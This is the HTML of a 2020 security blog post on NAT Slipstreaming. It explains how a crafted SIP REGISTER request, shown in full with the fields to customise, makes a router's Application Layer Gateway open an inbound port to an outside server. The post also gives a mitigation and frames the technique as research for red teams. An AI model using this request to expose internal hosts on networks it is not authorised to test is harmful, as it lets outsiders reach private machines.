@@ -1,0 +1,288 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head prefix="og: http://ogp.me/ns#">
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />
+  <meta property="og:title" content=" Abusing Application Layer Gateways (NAT Slipstreaming) &middot;  wunderwuzzi blog" />
+  
+  <meta property="og:site_name" content="wunderwuzzi blog" />
+  <meta property="og:url" content="https://embracethered.com/blog/posts/2020/nat-slipstreaming-simplified/" />
+  
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:article:published_time" content="2020-11-23T23:00:57-08:00" />
+  
+  <meta property="og:article:tag" content="red" />
+  
+  <meta property="og:article:tag" content="ttp" />
+  
+  <meta property="og:article:tag" content="research" />
+  
+  
+
+  <title>
+     Abusing Application Layer Gateways (NAT Slipstreaming) &middot;  wunderwuzzi blog
+  </title>
+
+  <link rel="stylesheet" href="https://embracethered.com/blog/css/bootstrap.min.css" />
+  <link rel="stylesheet" href="https://embracethered.com/blog/css/main.css" />
+  <link rel="stylesheet" href="https://embracethered.com/blog/css/font-awesome.min.css" />
+  <link rel="stylesheet" href="https://embracethered.com/blog/css/github.css" />
+  
+  <link rel="stylesheet" href="https://embracethered.com/blog/fonts/cachedfonts.css" type="text/css">
+  <link rel="shortcut icon" href="https://embracethered.com/blog/images/favicon.ico" />
+  <link rel="apple-touch-icon" href="https://embracethered.com/blog/images/apple-touch-icon.png" />
+  
+
+</head>
+<body>
+    <header class="global-header"  style="background-image:url( /blog/images/bg.png )">
+    <section class="header-text">
+      <h1><a href="https://embracethered.com/blog/">wunderwuzzi blog</a></h1>
+      
+      <div class="tag-line" style="min-width:fit-content; font-weight: 400;">
+        Embrace the Red
+        <br><a style="color: greenyellow; font-weight:300;text-decoration: underline; " href="https://www.amazon.com/gp/product/1838828869/ref=as_li_tl?ie=UTF8&camp=1789&creative=9325&creativeASIN=1838828869&linkCode=as2&tag=wunderwuzzi-20&linkId=b6523e937607be47499c6010ff489537">OUT NOW: Cybersecurity Attacks - Red Team Strategies</a> 
+      </div>
+      
+      <div class="sns-links hidden-print">
+  
+  <a href="mailto:security@wunderwuzzi.net">
+    <i class="fa fa-envelope"></i>
+  </a>
+  
+  
+  <a href="https://twitter.com/wunderwuzzi23" target="_blank">
+    <i class="fa fa-twitter"></i>
+  </a>
+  
+  
+  
+  
+  
+  <a href="https://github.com/wunderwuzzi23" target="_blank">
+    <i class="fa fa-github"></i>
+  </a>
+  
+  
+  
+  
+  
+  
+  
+  <a href="/blog/index.xml" target="_blank">
+    <i class="fa fa-rss"></i>
+  </a>
+</div>
+
+      
+      <a href="https://embracethered.com/blog/" class="btn-header btn-back hidden-xs">
+        <i class="fa fa-angle-left" aria-hidden="true"></i>
+        &nbsp;Home
+      </a>
+      
+    
+      <a href="/blog/index.xml" class="btn-header btn-subscribe hidden-xs">
+        <i class="fa fa-rss" aria-hidden="true"></i>
+        &nbsp;Subscribe
+      </a>
+    </section>
+  </header>
+  <main class="container">
+
+
+<article>
+  <header>
+    <h1 class="text-primary">Abusing Application Layer Gateways (NAT Slipstreaming)</h1>
+    <div class="post-meta clearfix">
+    
+      <div class="post-date pull-left">
+        Posted on
+        <time datetime="2020-11-23T23:00:57-08:00">
+          Nov 23, 2020
+        </time>
+      </div>
+    
+      <div class="pull-right">
+        
+        <span class="post-tag small"><a href="https://embracethered.com/blog//tags/red">#red</a></span>
+        
+        <span class="post-tag small"><a href="https://embracethered.com/blog//tags/ttp">#ttp</a></span>
+        
+        <span class="post-tag small"><a href="https://embracethered.com/blog//tags/research">#research</a></span>
+        
+      </div>
+    </div>
+  </header>
+  <section>
+    <p>You might have heard about <a href="https://samy.pl/slipstream/">&ldquo;NAT Slipstreaming&rdquo;</a> by Samy Kamkar. It&rsquo;s an amazing technique that allows punching a hole in your routers firewall by just visiting a website.</p>
+<p>The attack depends on the router having the <code>Application Layer Gateway</code> enabled. This gateway can be used by anyone inside your network to open a firewall port (totally by design). Protocols such as <code>SIP</code> (Session Initiation Protocol) use it.</p>
+<p>What I will focus on in this post is the <code>Application Layer Gateway Protocol</code> (<code>ALG</code>) and <code>SIP</code>. In particular to understand how these can be abused by an adversary.</p>
+<p>I won&rsquo;t be discussing the browser-based attack angle in this post.</p>
+<p>Let&rsquo;s get started.</p>
+<h2 id="application-layer-gateway-and-sip">Application Layer Gateway and SIP</h2>
+<p>The <code>ALG</code> monitors traffic passing through your router. It will act on and modify requests for some protocols if enabled. One of the protocols that can be enabled is <code>SIP</code>.</p>
+<p><code>SIP</code> is a text-based protocol, just like HTTP. It is used in Voice over IP (VoIP) applications. VoIP works better peer-to-peer, so there is a <code>REGISTER</code> verb that allows punching a hole into your firewall.</p>
+<p>More details of the <code>SIP</code> protocol are described in <a href="https://tools.ietf.org/html/rfc3327">RFC 3327</a>.</p>
+<p>To learn more about this I implemented a simple fake SIP server and a client for Linux/macOS and also a client for PowerShell for Windows.</p>
+<h3 id="implementing-a-fake-sip-server">Implementing a fake SIP Server</h3>
+<p>The fake SIP server is just a basic TCP server written in Python. I took the core messages that are sent back and forth from Samy&rsquo;s implementation.</p>
+<p>The code for the server, called it natty-slipstream, is <a href="https://github.com/wunderwuzzi23/natty-slipstream/blob/main/sip-server.py">here</a>.</p>
+<h3 id="sip-register-request">SIP REGISTER Request</h3>
+<p>After the fake <code>SIP</code> server is up and running outside your network, you can try to punch a hole in your firewall. This is done by sending the <code>REGISTER</code> request to the server.</p>
+<p>I created two implementations for this:</p>
+<ol>
+<li><a href="https://github.com/wunderwuzzi23/natty-slipstream/blob/main/Invoke-NATOpenPort.ps1">Windows PowerShell</a></li>
+<li><a href="https://github.com/wunderwuzzi23/natty-slipstream/blob/main/natty.sh.txt">Linux/macOS - Bash/curl</a></li>
+</ol>
+<p>For the <code>Bash</code> based Linux/macOS version <code>curl</code> is used. Interestingly my router did not mind some incorrect headers and strings in the <code>SIP</code> requests.</p>
+<p><em>If you are on macOS you might have to modify the way to get local IP, if you don&rsquo;t have <code>ip</code> available. Or just manually update the script and insert the IP on your local network</em></p>
+<p>This is how the request looks like:</p>
+<pre><code>REGISTER sip:example.org;transport=TCP SIP/2.0
+Via: SIP/2.0/TCP 192.168.1.141:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+Max-Forwards: 70
+Contact: &lt;sip:wuzzi@192.168.1.141:1433;rinstance=v40f3f83b335139c;transport=TCP&gt;
+To: &lt;sip:wuzzi@example.org;transport=TCP&gt;
+From: &lt;sip:wuzzi@example.org;transport=TCP&gt;;tag=U7c3d519
+Call-ID: aaaaaaaaaaaaaaaaa0404aaaaaaaaaaaabbbbbbZjQ4M2M.
+CSeq: 1 REGISTER
+Expires: 70
+Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+Allow-Events: presence, kpml
+Content-Length: 0
+
+</code></pre><p>The parts of the request that require customization are:</p>
+<ul>
+<li><code>192.168.1.141</code> The IP address of the internal target machine</li>
+<li><code>Port 5060</code> The remote port of the fake SIP Server</li>
+<li><code>Port 1433</code> The port that we want to expose externally to the fake SIP server</li>
+</ul>
+<h3 id="address-translation">Address Translation</h3>
+<p>If your router has <code>ALG</code> for <code>SIP</code> enabled, it will replace the internal IP address in the packet (in this case <code>192.168.1.141</code>) with the routers public IP address.</p>
+<h3 id="sip-response">SIP Response</h3>
+<p>After receiving the client&rsquo;s request, the server responds with the following message:</p>
+<pre><code>SIP/2.0 200 OK
+Via: SIP/2.0/TCP 174.nn.nn.nnn:59973;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP;received=10.10.10.10
+From: &lt;sip:wuzzi@example.org;transport=TCP&gt;;tag=U7c3d519
+To: &lt;sip:wuzzi@example.org;transport=TCP&gt;;tag=37GkEhwl6
+Call-ID: aaaaaaaaaaaaaaaaa0404aaaaaaaaaaaabbbbbbZjQ4M2M.
+CSeq: 1 REGISTER
+Contact: &lt;sip:wunder@174.nnn.nnn.nnn:44444;rinstance=v40f3f83b335139c;transport=TCP&gt;;expires=3600
+Content-Length: 0
+
+</code></pre><p>Notice the IP address (<code>174.nn.nn.nnn</code>) which is the public IP of the router.</p>
+<p>When the response is processed by the router, it will replace the public IP with the internal IP again.</p>
+<p>And it will open up the requested port <code>1433</code> for the server to connect. Nice.</p>
+<h3 id="the-hole-is-punched">The hole is punched</h3>
+<p>That is it, now I was able to connect to the port from the outside!</p>
+<p>The port stayed open for about 2 minutes. I tried changing the expiration header, but it did not change the duration of the exposure for my router model. But two minutes is plenty of time to connect.</p>
+<h2 id="mitigation">Mitigation</h2>
+<p>Check your router configuration to ensure attack surface is limited. Disabling <code>SIP</code> and <code>ALG</code> on the router will mitigate this. In my case there was no need for <code>ALG</code>, so this was a simple fix.</p>
+<p>This is a design flaw of the protocol, and it is not unlikely that more attacks in this realm will show up as more people start looking at this.</p>
+<h2 id="conclusion">Conclusion</h2>
+<p>That&rsquo;s it. Hope this was interesting and useful. For red teaming this is an interesting TTP to expose internal infrastructure with a benign looking request to port <code>5060</code>.</p>
+<p>If you haven&rsquo;t yet, check out <a href="https://www.amazon.com/gp/product/1838828869/ref=as_li_tl?ie=UTF8&amp;tag=wunderwuzzi-20&amp;camp=1789&amp;creative=9325&amp;linkCode=as2&amp;creativeASIN=1838828869&amp;linkId=07bfd6b729fbc2b2904160e0e16c337f">Cybersecurity Attacks - Red Team Strategies</a> for lots of red teaming goodies.</p>
+<p>Cheers,
+Johann.</p>
+<p>Twitter: <a href="https://twitter.com/wunderwuzzi23">@wunderwuzzi23</a></p>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://tools.ietf.org/html/rfc3327">RFC 3327</a></li>
+<li><a href="https://samy.pl/slipstream/">NAT Slipstream, Samy Kamkar</a></li>
+</ul>
+
+  </section>
+  <footer>
+    
+    
+    
+    <footer></footer><hr/>
+    
+    <ul class="pager">
+      
+      <li class="next disabled"><a href="#">Newer <span aria-hidden="true">&rarr;</span></a></li>
+      
+      
+      <li class="author-contact">
+        <a href="mailto:security@wunderwuzzi.net">
+          <i class="fa fa-envelope-o" aria-hidden="true"></i>
+          &nbsp;Contact me
+        </a>
+     </li>
+
+      
+      
+      <li class="previous"><a href="https://embracethered.com/blog/posts/2020/husky-ai-repudiation-threat-deny-action-machine-learning/"><span aria-hidden="true">&larr;</span> Older</a></li>
+      
+    </ul>
+  </footer>
+</article>
+</main>
+  <footer class="container global-footer">
+    <div class="copyright-note pull-left">
+     
+     (c) WUNDERWUZZI 2020
+     <div class="sns-links hidden-print">
+  
+  <a href="mailto:security@wunderwuzzi.net">
+    <i class="fa fa-envelope"></i>
+  </a>
+  
+  
+  <a href="https://twitter.com/wunderwuzzi23" target="_blank">
+    <i class="fa fa-twitter"></i>
+  </a>
+  
+  
+  
+  
+  
+  <a href="https://github.com/wunderwuzzi23" target="_blank">
+    <i class="fa fa-github"></i>
+  </a>
+  
+  
+  
+  
+  
+  
+  
+  <a href="/blog/index.xml" target="_blank">
+    <i class="fa fa-rss"></i>
+  </a>
+</div>
+ 
+     <div style="font-size:small;font-style: italic;color:crimson">
+    Disclaimer: Penetration testing requires authorization from proper stakeholders. Information on this blog is provided for research and educational purposes to advance understanding of attacks and countermeasures to help secure the Internet. 
+    </div>
+    </div>
+</footer>
+  <script src="https://embracethered.com/blog/js/highlight.pack.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad();
+  </script>
+  
+  
+
+
+
+<script type="text/javascript">
+  var _paq = window._paq || [];
+  _paq.push(["disableCookies"]);
+  _paq.push(['trackPageView']);
+  _paq.push(['enableLinkTracking']);
+  (function() {
+    var u="//wuzzi.net/anamato/inc/";
+    _paq.push(['setTrackerUrl', u+'rts.php']);
+    _paq.push(['setSiteId', '1']);
+    var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];
+    g.type='text/javascript'; g.async=true; g.defer=true; g.src=u+'rts.js'; s.parentNode.insertBefore(g,s);
+  })();
+</script>
+<img src="https://wuzzi.net/anamato/inc/rts.php?idsite=1&amp;rec=1" style="border:0;" alt="" />
+  
+</body>
+</html>
+
